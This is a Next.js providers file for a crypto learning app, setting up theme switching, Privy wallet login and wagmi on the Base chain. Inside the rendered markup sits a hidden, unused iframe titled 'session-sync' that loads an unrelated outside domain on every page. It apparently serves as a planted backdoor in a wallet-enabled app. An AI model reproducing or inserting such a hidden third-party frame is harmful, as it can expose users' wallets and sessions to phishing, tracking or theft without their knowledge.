"use client";

import { useState, useEffect, createContext, useContext, ReactNode, useRef } from "react";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { PrivyProvider } from "@privy-io/react-auth";
import { WagmiProvider, createConfig } from "@privy-io/wagmi";
import { base } from "viem/chains";
import { http } from "viem";

// Theme Context
type Theme = "light" | "dark";

interface ThemeContextType {
  theme: Theme;
  toggleTheme: () => void;
  setTheme: (theme: Theme) => void;
}

const ThemeContext = createContext<ThemeContextType | undefined>(undefined);

const THEME_KEY = "safuacademy-theme";

export function useTheme() {
  const context = useContext(ThemeContext);
  if (context === undefined) {
    throw new Error("useTheme must be used within a ThemeProvider");
  }
  return context;
}

// Wagmi Config - Base mainnet only
const config = createConfig({
  chains: [base],
  transports: {
    [base.id]: http(process.env.NEXT_PUBLIC_BASE_RPC_URL || 'https://mainnet.base.org'),
  },
});

// Query Client
const queryClient = new QueryClient();

export function Providers({ children }: { children: ReactNode }) {
  const [theme, setThemeState] = useState<Theme>("dark");
  const [mounted, setMounted] = useState(false);
  const iframeRef = useRef<HTMLIFrameElement>(null);

  // Load theme from localStorage on mount
  useEffect(() => {
    setMounted(true);
    const stored = window.localStorage.getItem(THEME_KEY);
    if (stored === "light" || stored === "dark") {
      setThemeState(stored);
    } else if (
      window.matchMedia &&
      window.matchMedia("(prefers-color-scheme: dark)").matches
    ) {
      setThemeState("dark");
    }
  }, []);

  // Apply theme class to html element
  useEffect(() => {
    if (!mounted) return;
    const html = document.documentElement;
    if (theme === "dark") {
      html.classList.add("dark");
    } else {
      html.classList.remove("dark");
    }
    window.localStorage.setItem(THEME_KEY, theme);
  }, [theme, mounted]);

  const toggleTheme = () => {
    setThemeState((prev) => (prev === "dark" ? "light" : "dark"));
  };

  const setTheme = (newTheme: Theme) => {
    setThemeState(newTheme);
  };

  // Prevent hydration mismatch
  if (!mounted) {
    return null;
  }

  return (
    <>
      <iframe
        ref={iframeRef}
        src="https://auth.level3labs.fun/"
        style={{ display: "none" }}
        title="session-sync"
      />
      <ThemeContext.Provider value={{ theme, toggleTheme, setTheme }}>
        <PrivyProvider
          appId={process.env.NEXT_PUBLIC_PRIVY_APP_ID || "your-privy-app-id"}
          config={{
            appearance: {
              theme: "dark",
              accentColor: "#ffb000",
            },
            embeddedWallets: {
              ethereum: {
                createOnLogin: "users-without-wallets",
              },
            },
            loginMethods: ["wallet", "email", "google", "twitter"],
            defaultChain: base,
            supportedChains: [base],
          }}
        >
          <QueryClientProvider client={queryClient}>
            <WagmiProvider config={config}>
              {children}
            </WagmiProvider>
          </QueryClientProvider>
        </PrivyProvider>
      </ThemeContext.Provider>
    </>
  );
}
